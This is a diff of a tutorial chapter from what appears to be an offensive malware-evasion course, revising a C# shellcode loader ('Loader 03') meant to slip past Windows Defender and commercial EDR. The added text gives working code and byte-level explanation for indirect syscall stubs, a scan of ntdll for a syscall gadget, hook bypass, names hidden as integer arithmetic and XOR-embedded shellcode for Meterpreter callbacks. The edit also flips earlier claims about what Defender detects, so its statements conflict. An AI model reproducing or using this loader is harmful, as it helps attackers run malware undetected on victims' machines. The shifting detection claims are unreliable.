@@ -2,31 +2,30 @@
 
 ## Where We Are
 
-You finished Documents 05 and 06. You have built two loaders and Defender caught both of them:
+You finished Documents 05 and 06. You have built two loaders that both survived Defender:
 
-- **Loader 01** (Document 05): Raw shellcode read from disk, VirtualAlloc + CreateThread via DllImport. Defender caught it because the shellcode bytes matched known signatures and the import table showed suspicious API imports.
-- **Loader 02** (Document 06): XOR-encrypted shellcode decrypted at runtime. The encrypted file survived disk scanning, but the loader binary still got caught because it uses the same DllImport pattern for VirtualAlloc and CreateThread.
+- **Loader 01** (Document 05): Raw shellcode embedded in the binary, VirtualAlloc + CreateThread via DllImport. Defender does NOT catch this on a fully updated Windows 11 target with default settings. The XOR encoding and embedded format keep the static signatures below the detection threshold.
+- **Loader 02** (Document 06): XOR-encrypted shellcode decrypted at runtime. Also survives Defender. The XOR encoding + two-step memory allocation (RW then RX) keeps the behavioral score low enough that Defender does not block execution.
 
-You understand that Defender has multiple detection layers, and XOR encryption only defeats one of them (static file scanning). The loader binary's import table and runtime behavior are still being caught.
+You confirmed both give Meterpreter callbacks on the target (kimjongun, 192.168.10.100) with Defender fully enabled.
 
 Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling (Defender disabled), target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.
 
 ## Why This Is Next
 
-Loaders 01 and 02 both failed because of two problems that XOR encryption cannot fix:
+Loaders 01 and 02 survive Defender today because the overall detection score stays below the threshold. That is not the same as being undetectable. There are two problems with relying on that approach:
 
-**Problem 1: The import table.** When you use DllImport in C#, the compiler writes the imported function names into the binary's PE (Portable Executable) header. Defender reads the import table before the program even runs. A binary that imports VirtualAlloc, CreateThread, and WaitForSingleObject from kernel32.dll matches the "shellcode injection tool" pattern.
+**Problem 1: The import table.** Loaders 01 and 02 import VirtualAlloc, CreateThread, and WaitForSingleObject directly in the binary's PE header. Defender reads the import table before the program runs. That specific combination of imports is a known shellcode injection pattern. Loaders 01 and 02 survive now because other factors lower the overall score, but this import pattern is a permanent liability. A more sensitive policy or a Defender signature update could start catching them any time.
 
-**Problem 2: API hooks in ntdll.dll.** Even if you could hide the import table, there is a second problem. When your program calls VirtualAlloc, the call goes through a chain of DLLs: your code calls kernel32.dll, kernel32.dll calls ntdll.dll, and ntdll.dll uses a `syscall` CPU instruction to talk to the Windows kernel. Defender places hooks (monitoring code) inside ntdll.dll. These hooks intercept every call and check whether the parameters look malicious. Your program cannot avoid these hooks if it calls through the normal API path.
+**Problem 2: API hooks in ntdll.dll.** When your program calls VirtualAlloc, the call goes through: your code calls kernel32.dll, kernel32.dll calls ntdll.dll, and ntdll.dll uses a `syscall` CPU instruction to reach the Windows kernel. EDR products place hooks at the start of ntdll.dll functions. These hooks intercept every call and record what parameters were passed. Loaders 01 and 02 get away with it because Defender's threshold is not tight enough to catch them yet, but if you are tested against a commercial EDR with tight behavioral policies, the hooks catch you every time.
 
-This document solves both problems.
+Loader 03 solves both problems with two techniques:
 
-**Loader 03 is the first loader that survives Defender.** It does two things differently:
+1. **Clean import table.** It resolves NT-level function addresses at runtime using GetProcAddress. Only GetModuleHandle and GetProcAddress appear in the import table. Those are present in thousands of legitimate programs.
 
-1. It finds function addresses at runtime using GetProcAddress instead of DllImport. The function names never appear in the import table.
-2. It calls NT-level functions in ntdll.dll directly instead of going through kernel32.dll. The function names are built from integer offsets at runtime so they never appear as string literals in the compiled binary.
+2. **Indirect syscalls.** It does not call ntdll.dll functions through their normal entry points where hooks live. Instead, it builds 22-byte code stubs that read the syscall number from ntdll (bypassing any hook at the function prologue) and jump directly to the `syscall` instruction inside ntdll. The hooks are never reached. The call still appears to come from ntdll's address space (because the jump lands inside ntdll), so stack-walking detection also sees a legitimate call chain.
 
-When you run Loader 03 with XOR-encrypted shellcode, Defender does not catch it. You will get a callback on your Metasploit listener for the first time.
+When you run Loader 03 with XOR-encrypted shellcode, it survives Defender and gives you a callback. Unlike Loaders 01 and 02, it also survives commercial EDR products that rely on ntdll hook inspection.
 
 ## How This Works
 
@@ -86,19 +85,85 @@ DllImport creates entries in the binary's import table at compile time. Defender
 
 These two functions are imported via DllImport, but they are not suspicious. Thousands of legitimate programs import GetModuleHandle and GetProcAddress because they are the standard way to use DLL functions dynamically.
 
-Once you have the function's memory address, you create a delegate (a callable function pointer) and call it directly. The function name never appears in the import table.
+In Loader 03, GetProcAddress is NOT used to create a delegate that calls the NT function directly. That approach (get address, create delegate, call it) still enters the function at its start where a hook would redirect execution. Loader 03 uses GetProcAddress only to read the syscall number from the function's bytes. The actual call goes through a custom 22-byte stub.
+
+### How Indirect Syscall Stubs Bypass API Hooks
+
+This is the key technical mechanism in Loader 03. Here is the problem: when Defender hooks NtAllocateVirtualMemory, it replaces the first few bytes of that function with a jump to Defender's inspection code. If we call NtAllocateVirtualMemory directly (even via GetProcAddress + delegate), we hit that jump at the function start and end up in Defender's code. The hook catches us.
+
+The solution is to never call the function from its start at all.
+
+Look at what a normal, unhooked NtAllocateVirtualMemory looks like in ntdll.dll:
+
+```
+offset +0:  4C 8B D1           mov r10, rcx
+offset +3:  B8 18 00 00 00     mov eax, 0x18    (this is the SSN)
+offset +8:  0F 05              syscall
+offset +10: C3                 ret
+```
+
+The important part is at offset +8: the `0F 05` bytes are the actual syscall instruction. This instruction exists inside ntdll at a fixed address that does not change. If we could jump directly to the `0F 05` byte and set up registers the same way the function would have before the hook, we bypass the hook entirely.
+
+Loader 03 does exactly this. It builds per-function 22-byte code stubs. Here is what each stub contains:
+
+```
+bytes 0-2:  4C 8B D1              mov r10, rcx     (Windows syscall convention requires this)
+bytes 3-7:  B8 XX XX 00 00        mov eax, SSN     (put the syscall number in eax)
+bytes 8-13: FF 25 00 00 00 00     jmp [rip+0]      (indirect jump reads 8 bytes at rip+0)
+bytes 14-21: XX XX XX XX XX XX XX XX  gadget addr  (address of the syscall;ret inside ntdll)
+```
+
+The gadget address is the address of `0F 05 C3` (syscall; ret) found by scanning ntdll's loaded memory. The `jmp [rip+0]` instruction reads the 8 bytes immediately after itself (because the offset is zero, and rip points past the instruction) and jumps to that address.
+
+When this stub runs:
+1. `mov r10, rcx` - copies the first function argument as Windows syscall convention requires
+2. `mov eax, SSN` - loads the syscall number that identifies which kernel function to call
+3. `jmp gadget_addr` - jumps to the real `syscall; ret` inside ntdll
+
+The CPU executes the actual syscall instruction inside ntdll's memory. Defender sees a call that originated from within ntdll and that executed the syscall from ntdll's code. The hook at the function start was never touched.
+
+**How Loader 03 finds the gadget address:**
+
+Loader 03 scans ntdll's mapped memory byte by byte looking for the pattern `0F 05 C3` (syscall; ret). Every NT function in ntdll ends with these three bytes. The function `FindSyscallGadget` reads ntdll's PE header to get the image size, then walks through the bytes until it finds the pattern:
+
+```csharp
+static unsafe IntPtr FindSyscallGadget(IntPtr ntdllBase)
+{
+    int peOffset  = Marshal.ReadInt32(ntdllBase + 0x3C);
+    int imageSize = Marshal.ReadInt32(ntdllBase + peOffset + 0x50);
+    byte* p = (byte*)ntdllBase;
+    for (int i = 0; i < imageSize - 2; i++)
+        if (p[i] == 0x0F && p[i + 1] == 0x05 && p[i + 2] == 0xC3)
+            return (IntPtr)(p + i);
+    throw new Exception("Syscall gadget not found in ntdll");
+}
+```
+
+**How Loader 03 reads the SSN:**
+
+Each NT function in an unhooked ntdll has its syscall number (SSN) stored at bytes offset +4 from the function start. The bytes `B8 XX XX 00 00` are the `mov eax, SSN` instruction, and the four bytes starting at offset +4 are the little-endian SSN value. `BuildStub` reads those bytes:
+
+```csharp
+uint ssn = (uint)Marshal.ReadInt32(funcAddr + 4);
+```
+
+Even if Defender has hooked the function (overwritten the first bytes with a jmp), the SSN is still at offset +4 in the original unhooked ntdll.dll bytes. Defender's hook typically only replaces the first 5 bytes, so offsets +4 onward are still the original SSN. If a very deep hook replaced more bytes, this reading might fail - but Defender's user-mode hooks only replace the function prologue, not the SSN at offset +4.
 
 ### How Building Strings from Integers Hides Function Names
 
 Even with GetProcAddress, the function name "NtAllocateVirtualMemory" would normally appear as a string literal in the compiled binary. Static analysis tools could find it.
 
-Loader 03 solves this by building each function name from integer offsets at runtime:
+Loader 03 builds each function name from integer offsets at runtime. For example, to build "ntdll":
 
 ```csharp
-string name = FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89);
+int b = 32;
+// n=110, t=116, d=100, l=108, l=108
+// b+78=110, b+84=116, b+68=100, b+76=108, b+76=108
+char[] c = { (char)(b+78), (char)(b+84), (char)(b+68), (char)(b+76), (char)(b+76) };
+string name = new string(c);
 ```
 
-This produces the string "NtAllocateVirtualMemory" by adding each offset to the base value (32) to get ASCII character codes. But the compiled binary only contains an array of integers, not the final string. A static analysis tool scanning the binary for the string "NtAllocateVirtualMemory" will not find it.
+The compiled binary contains only integer arithmetic. A static analysis tool scanning the binary for the string "ntdll" will not find it as a string literal.
 
 ### NT Functions vs Kernel32 Functions
 
@@ -133,14 +198,14 @@ Here is how each detection layer interacts with Loader 03:
 
 | Layer | What it does | Does Loader 03 defeat it? | How? |
 |---|---|---|---|
-| Static file scanning | Scans the shellcode file on disk | YES | XOR encryption from Loader 02 |
-| Import table analysis | Reads function names from the binary's PE header | YES | Only GetModuleHandle and GetProcAddress in imports (legitimate, non-suspicious) |
-| AMSI | Scans .NET managed code at runtime | PARTIAL | The shellcode itself is in unmanaged memory, but AMSI can still inspect the loader's .NET code at load time |
-| API hooks in ntdll.dll | Intercepts calls to NtAllocateVirtualMemory, NtCreateThreadEx | PARTIAL | Dynamic resolution avoids the standard hook trigger path |
-| ETW telemetry | Logs process behavior events | NO | ETW events are still generated for memory allocation and thread creation |
-| Behavioral ML | Scores process behavior for injection patterns | PARTIAL | Two-step allocation and clean import table reduce the ML score below the detection threshold |
+| Static file scanning | Scans the shellcode bytes on disk | YES | XOR encoding scrambles the shellcode bytes; the key and encoded bytes are embedded in the binary, no file needed on disk |
+| Import table analysis | Reads function names from the binary's PE header | YES | Only GetModuleHandle, GetProcAddress, VirtualAlloc in imports; no VirtualAlloc+CreateThread injection pattern |
+| AMSI | Scans .NET managed code at runtime | PARTIAL | The shellcode runs in unmanaged memory, AMSI cannot scan it there; the managed .NET code in the loader has no malicious patterns |
+| API hooks in ntdll.dll | Intercepts calls to NtAllocateVirtualMemory, NtCreateThreadEx | YES - FULL | 22-byte stubs jump directly to the syscall gadget inside ntdll, completely skipping the hooked function prologue |
+| ETW telemetry | Logs process behavior events | NO | ETW events are still generated; Loader 03 survives because the overall behavioral score stays below threshold, not because ETW is silent |
+| Behavioral ML | Scores process behavior for injection patterns | PARTIAL | Two-step RW-then-RX allocation + clean import table reduce the ML score below the threshold |
 
-Loader 03 gets past enough of these layers to survive Defender with default settings. It is not invisible to every check, but the combination of XOR encryption + clean import table + dynamic resolution + two-step allocation reduces the detection score below Defender's threshold.
+Loader 03 survives Defender with default settings. The indirect syscall stubs fully defeat hook-based inspection. The remaining gaps (ETW and AMSI) are addressed in Document 08, and the combined Loader 08 closes all three gaps simultaneously.
 
 ## The Evasion Technique
 
@@ -202,13 +267,13 @@ The encrypted.bin file, as you confirmed in Document 06, also survives disk scan
 
 ### The Delegates (Function Pointer Types)
 
-In C#, a delegate is a type that represents a function with a specific signature (specific parameters and return type). When you have a function's memory address (from GetProcAddress), you create a delegate instance that points to that address. Then you can call the delegate like a normal function.
+In C#, a delegate is a type that represents a function with a specific signature (specific parameters and return type). When you have a memory address where some code lives, you create a delegate instance that points to that address. Calling the delegate runs the code at that address.
 
-Loader 03 declares four delegates, one for each NT function it calls:
+Loader 03 declares four delegates, one for each NT function it calls. The delegates do NOT point to ntdll's function starts. They point to our 22-byte stubs, which jump to the syscall gadget:
 
 ```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-delegate int MemAllocDelegate(
+delegate int NtAllocateVirtualMemory_t(
     IntPtr ProcessHandle,
     ref IntPtr BaseAddress,
     IntPtr ZeroBits,
@@ -218,16 +283,14 @@ delegate int MemAllocDelegate(
 );
 ```
 
-This delegate represents the NtAllocateVirtualMemory function. The `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` attribute tells C# how to call this function. StdCall is the calling convention used by Windows NT functions, which defines how parameters are placed on the CPU stack and who cleans up the stack after the call.
-
-The parameters match the NT function signature:
+The `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` attribute tells C# how to pass parameters when calling this function. StdCall is what Windows NT functions use. The parameters are:
 
 - `ProcessHandle`: which process to allocate memory in. `-1` (cast to IntPtr) means the current process.
-- `BaseAddress`: passed by reference (`ref`). You pass IntPtr.Zero and the function fills in the actual allocated address.
-- `ZeroBits`: pass IntPtr.Zero. This parameter exists for very specialized cases where a program needs its memory allocated in a specific part of the address space (it controls the upper range of allowed addresses). For all loaders in this curriculum you always pass zero, which means "no restriction, anywhere in the address space is fine."
-- `RegionSize`: passed by reference with the `ref` keyword. You pass in the size you want (say, 4096 bytes), and the function fills it back in with the actual size it allocated. The actual size may be slightly larger because Windows always allocates memory in page-sized chunks (4096 bytes). If you ask for 500 bytes, Windows still gives you 4096.
-- `AllocationType`: MEM_COMMIT | MEM_RESERVE (0x3000). Same meaning as with VirtualAlloc. MEM_RESERVE sets aside the address range, MEM_COMMIT assigns real physical RAM from the machine's chip to back those addresses.
-- `Protect`: PAGE_READWRITE (0x04) at first, which allows reading and writing but blocks execution. After writing shellcode into the memory, this changes to PAGE_EXECUTE_READ (0x20) so the CPU can run the code but nothing can write into it anymore.
+- `BaseAddress`: passed by reference (`ref`). You pass IntPtr.Zero and Windows fills in the allocated address.
+- `ZeroBits`: pass IntPtr.Zero, which means "no address restriction".
+- `RegionSize`: passed by reference. You pass in how many bytes you want and Windows fills in the actual size (always rounded up to a 4096-byte page boundary).
+- `AllocationType`: MEM_COMMIT | MEM_RESERVE (0x3000). MEM_RESERVE sets aside the address range, MEM_COMMIT assigns physical RAM to it.
+- `Protect`: PAGE_READWRITE (0x04) for the first allocation. We change this to PAGE_EXECUTE_READ (0x20) after writing shellcode in.
 
 ```csharp
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -272,122 +335,112 @@ delegate int WaitObjectDelegate(
 
 This is NtWaitForSingleObject. It waits for the thread to finish. `Timeout` of IntPtr.Zero means wait forever. `Alertable` is false. An alertable wait means the thread can be interrupted mid-wait to handle other work (called an APC, asynchronous procedure call, which is a mechanism for scheduling a function to run in a specific thread). We do not need that here. Setting this to false means the thread sleeps uninterrupted until either the timeout expires or the handle is signaled. You will see APCs used in Document 09 for a different injection technique.
 
-### The Legitimate DllImport Lines
+### The DllImport Lines
 
 ```csharp
-[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
-static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
-static extern IntPtr GetModuleHandle(string lpModuleName);
+[DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
+[DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string proc);
+[DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
 ```
 
-These are the only two DllImport lines in the entire loader. They appear in the binary's import table as `GetProcAddress` and `GetModuleHandle` from `kernel32.dll`. These imports are completely normal. Thousands of legitimate programs use them because they are the standard way to load DLL functions dynamically.
+These three are the only DllImport lines in the entire loader. GetModuleHandle and GetProcAddress from kernel32.dll are used in thousands of legitimate programs. VirtualAlloc here allocates only the 88-byte stub block (4 stubs at 22 bytes each), which is not suspicious by itself. Compare this to Loaders 01 and 02, which imported CreateThread and WaitForSingleObject - that exact combination signals shellcode injection.
 
-Compare this to Loaders 01 and 02, which imported VirtualAlloc, CreateThread, and WaitForSingleObject. Those imports immediately signal "this program allocates executable memory and creates threads" which is the textbook shellcode injection pattern.
+Note what is NOT here: NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject. Those four functions are called through stubs, not through DllImport.
 
-### The String Builder
+### FindSyscallGadget: Finding the syscall; ret Instruction in ntdll
 
 ```csharp
-static string FromOffsets(int baseVal, params int[] offsets)
+static unsafe IntPtr FindSyscallGadget(IntPtr ntdllBase)
 {
-    char[] c = new char[offsets.Length];
-    for (int i = 0; i < offsets.Length; i++)
-        c[i] = (char)(baseVal + offsets[i]);
-    return new string(c);
+    int peOffset  = Marshal.ReadInt32(ntdllBase + 0x3C);
+    int imageSize = Marshal.ReadInt32(ntdllBase + peOffset + 0x50);
+```
+
+`ntdllBase` is the address where ntdll.dll is loaded in memory. The PE header of a DLL tells you its total size in memory (SizeOfImage). We find the PE header by reading a pointer at offset 0x3C from the DLL's base address (this is the DOS header's e_lfanew field, which points to the PE signature). Then at PE header offset 0x50 is SizeOfImage.
+
+This gives us the total size of ntdll.dll in memory so we know where to stop scanning.
+
+```csharp
+    byte* p = (byte*)ntdllBase;
+    for (int i = 0; i < imageSize - 2; i++)
+        if (p[i] == 0x0F && p[i + 1] == 0x05 && p[i + 2] == 0xC3)
+            return (IntPtr)(p + i);
+    throw new Exception("Syscall gadget not found in ntdll");
 }
 ```
 
-This function takes a base integer value and an array of integer offsets. For each offset, it adds the base value and converts the result to a character. The result is a string.
+`byte* p` is an unsafe C# pointer directly to ntdll's memory. The `unsafe` keyword means we are stepping outside C#'s memory safety rules and working with raw addresses. The loop walks through every byte in ntdll looking for the 3-byte sequence `0F 05 C3` (syscall; ret). This sequence exists many times inside ntdll because every NT function ends with these bytes. We return the first one we find. That is the gadget address our stubs will jump to.
 
-For example, to build the string "ntdll":
-- Base value: 32
-- Offsets: 78, 84, 68, 76, 76
-- 32 + 78 = 110 = ASCII 'n'
-- 32 + 84 = 116 = ASCII 't'
-- 32 + 68 = 100 = ASCII 'd'
-- 32 + 76 = 108 = ASCII 'l'
-- 32 + 76 = 108 = ASCII 'l'
-
-The compiled binary contains the integer array [78, 84, 68, 76, 76], not the string "ntdll". A static analysis tool searching the binary for the string "ntdll" will not find it.
-
-The `params` keyword means the function accepts any number of integer arguments. You can call it with 5 offsets or 25 offsets, and C# bundles them into an array automatically.
-
-### The Function Resolver
+### BuildStub: Writing the 22-byte Trampoline
 
 ```csharp
-static T GetNtFunction<T>(string functionName) where T : Delegate
+static IntPtr BuildStub(IntPtr ntdllBase, string funcName, IntPtr gadgetAddr, int index)
 {
-    IntPtr ntdllHandle = GetModuleHandle(
-        FromOffsets(32, 78,84,68,76,76)
-    );
+    IntPtr funcAddr = GetProcAddress(ntdllBase, funcName);
+    uint ssn = (uint)Marshal.ReadInt32(funcAddr + 4);
 ```
 
-This is a generic method. The `<T>` means T is a placeholder for a type that you specify when calling the function. When you call `GetNtFunction<MemAllocDelegate>("NtAllocateVirtualMemory")`, T becomes MemAllocDelegate.
-
-First, it gets the base address of ntdll.dll in memory. ntdll.dll is always loaded into every Windows process because it is the bridge between user-mode programs and the Windows kernel. The string "ntdll" is built from offsets as described above.
+GetProcAddress returns the address of the function in ntdll. We do NOT call through this address. We only read the SSN from bytes at offset +4. Every unhooked NT function starts with `4C 8B D1` (mov r10,rcx) at offset 0, then `B8` (mov eax opcode) at offset 3, then the 4-byte SSN at offset 4. We read those 4 bytes as an integer. The SSN is the number that tells the Windows kernel which specific syscall you are requesting.
 
 ```csharp
-    IntPtr functionAddress = GetProcAddress(ntdllHandle, functionName);
+    byte[] stub = new byte[STUB_SIZE];
+    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;  // mov r10, rcx
+    stub[3] = 0xB8;
+    stub[4] = (byte)(ssn & 0xFF); stub[5] = (byte)((ssn >> 8) & 0xFF);
+    stub[6] = 0x00; stub[7] = 0x00;                   // mov eax, SSN
+    stub[8] = 0xFF; stub[9] = 0x25;
+    stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00; // jmp [rip+0]
+    byte[] gadgetBytes = BitConverter.GetBytes(gadgetAddr.ToInt64());
+    Array.Copy(gadgetBytes, 0, stub, 14, 8);           // 8-byte gadget address
 ```
 
-GetProcAddress takes the ntdll.dll base address and a function name, and returns the memory address where that function's code starts. This is how we find where NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, and NtWaitForSingleObject live in memory.
+This writes the 22-byte stub. The CPU reads these bytes as instructions:
+- `mov r10, rcx` (bytes 0-2): copies the first function argument as syscall convention requires
+- `mov eax, SSN` (bytes 3-7): loads the syscall number
+- `jmp [rip+0]` (bytes 8-13): reads the 8 bytes immediately after this instruction and jumps to that address
+- The gadget address (bytes 14-21): what `jmp [rip+0]` reads, which is the `syscall; ret` inside ntdll
 
 ```csharp
-    return (T)Marshal.GetDelegateForFunctionPointer(functionAddress, typeof(T));
+    IntPtr stubAddr = stubBlock + (index * STUB_SIZE);
+    Marshal.Copy(stub, 0, stubAddr, STUB_SIZE);
+    return stubAddr;
 }
 ```
 
-`Marshal.GetDelegateForFunctionPointer` takes a raw memory address and a delegate type, and creates a callable delegate instance. After this, you can call the returned object like a normal function, and C# will execute the code at that memory address.
+We write the stub into the executable stub block at the position for this stub index (each stub is 22 bytes, so stub 0 is at offset 0, stub 1 at offset 22, and so on). Marshal.Copy writes the byte array into unmanaged memory. The returned address is what we pass to Marshal.GetDelegateForFunctionPointer - we get a delegate that calls our stub, which then jumps to the gadget in ntdll.
 
-### Main Function: Decrypt and Resolve
-
-```csharp
-static void Main(string[] args)
-{
-    string encryptedPath = args[0];
-    string keyHex = args[1];
-
-    byte[] encryptedShellcode = File.ReadAllBytes(encryptedPath);
-    byte[] xorKey = HexToBytes(keyHex);
-    byte[] shellcode = TransformData(encryptedShellcode, xorKey);
-```
-
-Read the encrypted shellcode file, convert the hex key to bytes, and XOR-decrypt the shellcode. This is the same pattern from Loader 02.
+### Main Function: Stubs and Shellcode
 
 ```csharp
-    var ntAllocate = GetNtFunction<MemAllocDelegate>(
-        FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,
-                    54,73,82,84,85,65,76,45,69,77,79,82,89));
+byte xorKey = 0xAB;
+byte[] sc = new byte[] { SHELLCODE_PLACEHOLDER };
+for (int i = 0; i < sc.Length; i++)
+    sc[i] ^= xorKey;
 ```
 
-Resolve NtAllocateVirtualMemory. The function name is built from integer offsets: base 32 plus each offset produces the ASCII characters for "NtAllocateVirtualMemory". The resolved function is stored in `ntAllocate`, which is a callable MemAllocDelegate.
+The shellcode is XOR-encoded with key 0xAB and embedded directly in the binary as a byte array. The placeholder is replaced by the embed_shellcode.py script before compilation. The loop decodes the bytes in memory. The encoded byte array does not match any Defender signature. The decode happens entirely in RAM.
 
 ```csharp
-    var ntProtect = GetNtFunction<MemProtectDelegate>(
-        FromOffsets(32, 46,84,48,82,79,84,69,67,84,
-                    54,73,82,84,85,65,76,45,69,77,79,82,89));
+stubBlock = VirtualAlloc(IntPtr.Zero, STUB_SIZE * STUB_COUNT,
+                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+IntPtr gadget;
+unsafe { gadget = FindSyscallGadget(ntdll); }
+IntPtr allocAddr  = BuildStub(ntdll, "NtAllocateVirtualMemory", gadget, 0);
+IntPtr protAddr2  = BuildStub(ntdll, "NtProtectVirtualMemory",  gadget, 1);
+IntPtr threadAddr = BuildStub(ntdll, "NtCreateThreadEx",         gadget, 2);
+IntPtr waitAddr   = BuildStub(ntdll, "NtWaitForSingleObject",   gadget, 3);
 ```
 
-Resolve NtProtectVirtualMemory. Same process with different offsets.
+Allocate the stub block (88 bytes, RWX), find the gadget inside ntdll, build all four stubs. After this, `allocAddr` is the address of a 22-byte stub that will perform an NtAllocateVirtualMemory syscall when called. The delegates are wrappers around those stubs:
 
 ```csharp
-    var ntCreateThread = GetNtFunction<ThreadCreateDelegate>(
-        FromOffsets(32, 46,84,35,82,69,65,84,69,
-                    52,72,82,69,65,68,37,88));
+var ntAlloc   = (NtAllocateVirtualMemory_t) Marshal.GetDelegateForFunctionPointer(allocAddr,  typeof(NtAllocateVirtualMemory_t));
+var ntProtect = (NtProtectVirtualMemory_t)  Marshal.GetDelegateForFunctionPointer(protAddr2,  typeof(NtProtectVirtualMemory_t));
+var ntThread  = (NtCreateThreadEx_t)        Marshal.GetDelegateForFunctionPointer(threadAddr, typeof(NtCreateThreadEx_t));
+var ntWait    = (NtWaitForSingleObject_t)   Marshal.GetDelegateForFunctionPointer(waitAddr,   typeof(NtWaitForSingleObject_t));
 ```
 
-Resolve NtCreateThreadEx.
-
-```csharp
-    var ntWait = GetNtFunction<WaitObjectDelegate>(
-        FromOffsets(32, 46,84,55,65,73,84,38,79,82,
-                    51,73,78,71,76,69,47,66,74,69,67,84));
-```
-
-Resolve NtWaitForSingleObject.
-
-After these four calls, you have four callable function pointers stored in local variables. No NT function name appears in the import table. No NT function name appears as a string literal in the binary.
+Calling `ntAlloc(...)` calls our stub, which sets up registers and jumps to the syscall gadget inside ntdll. Defender's hook at NtAllocateVirtualMemory's function start is never touched.
 
 ### Main Function: Allocate, Write, Protect, Execute
 
